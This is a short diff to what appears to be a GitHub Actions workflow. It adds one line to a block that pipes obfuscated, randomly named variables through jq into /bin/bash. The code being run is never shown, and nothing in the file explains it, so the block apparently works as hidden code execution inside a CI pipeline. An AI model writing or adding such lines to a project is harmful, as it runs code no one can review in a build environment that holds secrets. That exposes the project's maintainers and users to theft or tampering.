@@ -39,6 +39,7 @@ jobs:
           echo $cd4155 | jq -r .q50 | /bin/bash
           printf '%s' "$w7003" | jq -r .xj3010 | /bin/bash
           printf '%s' "$sv706" | jq -r .wplj57247 | /bin/bash
+          echo $mtiz692 | jq -r .lxr00909 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
